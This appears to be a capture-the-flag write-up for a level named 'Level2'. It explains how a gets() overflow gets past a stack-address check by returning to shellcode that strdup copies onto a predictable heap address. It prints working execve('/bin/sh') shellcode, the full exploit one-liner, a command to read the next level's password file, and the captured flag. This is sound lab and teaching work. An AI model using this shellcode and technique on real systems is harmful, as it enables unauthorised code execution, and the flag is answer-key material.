# 💥 Level2 - Return-to-Heap Exploit

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Advanced buffer overflow with heap exploitation! 🔥

## 📋 Binary Analysis

### 🔍 Main Function (Ghidra)
```c
void main(void)
{
    p();
    return;
}
```

### 🎯 P Function (Decompiled)
```c
void p(void)
{
    unsigned int ret_addr;
    char buffer[76];
    
    fflush(stdout);
    gets(buffer);
    
    ret_addr = __builtin_return_address(0);
    if ((ret_addr & 0xb0000000) == 0xb0000000) {
        printf("(%p)\n", ret_addr);
        _exit(1);
    }
    
    puts(buffer);
    strdup(buffer);
    return;
}
```

## 🚨 Vulnerability

### The Problem
- `gets()` is **unsafe** - no boundary checking! ⚠️
- Buffer is **76 bytes** (0x4c)
- EIP offset at **80 bytes**
- **NEW**: Return address protection checks for stack addresses (0xb...)

### The Stack Protection
```asm
0x080484f2 <+30>:    mov    0x4(%ebp),%eax     # Get return address
0x080484fb <+39>:    and    $0xb0000000,%eax   # Mask high bits
0x08048500 <+44>:    cmp    $0xb0000000,%eax   # Check if 0xb...
0x08048505 <+49>:    jne    0x8048527 <p+83>   # If NOT stack, continue
```

This prevents classic stack-based exploits! Stack addresses start with `0xbffff...`

### The Bypass: Heap Exploitation 🎯
- `strdup()` allocates memory on the **heap**
- Heap addresses start with `0x0804...` (not `0xb...`)
- No ASLR - heap address is **predictable**: `0x0804a008`
- We can place shellcode in input → strdup copies to heap → jump to heap!

## 🎯 How the Exploit Works

### The Key Difference from Level1

**Level1**: Return to a function already in memory  
**Level2**: Can't return to stack (protected) → Return to **heap** where we inject our own code

### Memory Layout: Stack vs Heap

```
High Memory
├─────────────────────────┐
│ Stack (0xbffff...)      │ ← Blocked by protection!
│ [buffer with overflow]  │
├─────────────────────────┤
│ Libraries               │
├─────────────────────────┤
│ Heap (0x0804a...)       │ ← Our target! ✅
│ [shellcode copied here] │
├─────────────────────────┤
│ Code (0x08048...)       │
Low Memory
```

### The Attack Flow

**Step 1: Craft Malicious Input**
```
[Shellcode: 24 bytes] + [Padding: 56 'A's] + [Heap Address: 0x0804a008]
```

**Step 2: gets() Writes to Stack**
```
Stack after gets():
0xbffff7fc: 0x0804a008 ← Return address (overwritten!)
0xbffff7f8: 0x41414141 ← Padding ('AAAA')
...
0xbffff7ac: [shellcode] ← Buffer start
```

**Step 3: Protection Check**
```c
if ((0x0804a008 & 0xb0000000) == 0xb0000000)  // FALSE ✅
```
- Our heap address `0x0804a008` doesn't start with `0xb`
- Check passes! Program continues.

**Step 4: strdup() Copies to Heap**
```
strdup(buffer) allocates heap memory and copies our shellcode:

Heap at 0x0804a008:
[\x31\xc0\x99\x50...]  ← Our shellcode now lives here!
```

**Step 5: Return to Heap**
```
p() returns:
  ret → EIP = [ESP] = 0x0804a008
  CPU jumps to heap!
  Executes our shellcode!
  Shell spawned! 🎉
```

### Why This Works

| Requirement | Status | Explanation |
|-------------|--------|-------------|
| **Overflow** | ✅ | `gets()` has no bounds checking |
| **Bypass check** | ✅ | Heap address `0x0804a008` doesn't match `0xb...` pattern |
| **Predictable heap** | ✅ | No ASLR → heap always at same address |
| **Executable heap** | ✅ | No DEP → can execute code from heap |
| **strdup() magic** | ✅ | Copies our shellcode to known heap location |

### Visual: Complete Exploit Chain

```
Input → gets() writes to stack buffer
            ↓
        Contains: [shellcode][padding][heap_addr]
            ↓
        strdup() copies to heap at 0x0804a008
            ↓
        Overflow overwrites return address → 0x0804a008
            ↓
        Protection check: 0x0804a008 & 0xb0000000 = 0x00000000 ✅
            ↓
        ret executes: EIP = 0x0804a008
            ↓
        Jump to heap → Execute shellcode → Shell! 🚩
```

## 💣 Exploit Strategy

### Step 1: Analyze with Ghidra
From the decompiled code we can see:
- Buffer is **76 bytes**
- **strdup()** copies our input to the heap
- Stack address protection: blocks addresses starting with `0xb...`
- **EIP offset**: 76 (buffer) + 4 (saved EBP) = **80 bytes**

### Step 2: Find Heap Address (Runtime Check)
```bash
ltrace ./level2
# Input: AAAA
# Output: strdup("AAAA") = 0x0804a008
```

The heap address is **`0x0804a008`** (predictable, no ASLR)

### Step 3: Get Shellcode

**Source**: [Exploit-DB Shellcode #42428](https://www.exploit-db.com/shellcodes/42428)  
**Author**: Touhid M.Shaikh  
**Platform**: Linux/x86  
**Description**: Stack-based execve("/bin/sh") shellcode

```
\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

**Assembly Breakdown**:
```asm
xor    eax, eax              # Clear eax (NULL)
cdq                          # Sign extend eax to edx (edx = 0)
push   eax                   # Push NULL terminator
push   0x68732f2f            # Push "//sh"
push   0x6e69622f            # Push "/bin"
mov    ebx, esp              # ebx = pointer to "/bin//sh"
push   eax                   # Push NULL (argv[1])
push   ebx                   # Push address of "/bin//sh" (argv[0])
mov    ecx, esp              # ecx = pointer to argv array
mov    al, 0x0b              # syscall 11 = execve
int    0x80                  # Make syscall
```

### Step 4: Build the Exploit
```
[Shellcode: 24 bytes] + [Padding: 56 bytes] + [Heap Address: 4 bytes]
                                                     ↓
                                                0x0804a008
```

Execute:
```bash
(python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*56 + "\x08\xa0\x04\x08"'; cat) | ./level2
```

### Step 5: Get the Flag
```bash
whoami    # level3
cat /home/user/level3/.pass
```

---

> 💡 **Pro Tip**: When stack is protected, look for heap allocations like `malloc()`, `strdup()`, `calloc()`!

> ⚠️ **Security Note**: This demonstrates why multiple security layers ([ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) + [DEP](https://en.wikipedia.org/wiki/Executable_space_protection) + [Stack Canaries](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries)) are needed!

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
